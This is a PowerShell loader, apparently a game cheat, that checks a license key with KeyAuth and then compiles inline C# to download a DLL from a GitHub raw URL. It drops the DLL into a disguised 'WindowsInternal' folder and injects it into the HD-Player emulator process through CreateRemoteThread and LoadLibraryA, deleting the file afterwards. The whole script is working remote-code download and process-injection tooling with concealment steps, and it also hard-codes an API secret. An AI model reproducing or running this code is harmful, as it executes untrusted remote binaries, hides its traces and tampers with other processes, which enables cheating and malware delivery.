[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- App Config ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
$target  = "HD-Player"

function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX MANUAL MAP SYSTEM    " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$($initRes.sessionid)&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Auth Success." -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Net;
    using System.Text;
    using System.IO;

    public class MapNode {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);

        public static bool Inject(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                byte[] dllBytes = wc.DownloadData(url);

                IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return false;

                // Create a temporary decoy file in a hidden path
                string hiddenDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WindowsInternal");
                if (!Directory.Exists(hiddenDir)) Directory.CreateDirectory(hiddenDir);
                
                string hiddenPath = Path.Combine(hiddenDir, "sys_cache_" + Guid.NewGuid().ToString().Substring(0,8) + ".tmp");
                File.WriteAllBytes(hiddenPath, dllBytes);

                // Allocate and Write Path
                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)hiddenPath.Length + 1, 0x3000, 0x40);
                IntPtr w;
                WriteProcessMemory(hProc, alloc, Encoding.Default.GetBytes(hiddenPath), (uint)hiddenPath.Length + 1, out w);

                // LoadLibraryA via Remote Thread
                IntPtr hKernel = GetModuleHandle("kernel32.dll");
                IntPtr hLoadLib = GetProcAddress(hKernel, "LoadLibraryA");
                IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoadLib, alloc, 0, IntPtr.Zero);

                if (hThread != IntPtr.Zero) {
                    System.Threading.Thread.Sleep(4000); // Wait for load
                    if (File.Exists(hiddenPath)) File.Delete(hiddenPath);
                    return true;
                }
            } catch { }
            return false;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Status: Monitoring $target..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $target -ErrorAction SilentlyContinue
        if ($p) {
            Write-Host "[!] Target found. Mapping DLL into process space..." -ForegroundColor Yellow
            if ([MapNode]::Inject($dllUrl, $p.Id)) {
                Write-Host "[+] Injection successful! The DLL is now in memory." -ForegroundColor Green
                Write-Host "[*] You can now press F6 in game." -ForegroundColor White
                break
            } else {
                Write-Host "[-] Access Denied. Still blocked by Emulator." -ForegroundColor Red
                Start-Sleep -Seconds 5
            }
        }
        Start-Sleep -Seconds 2
    }
}
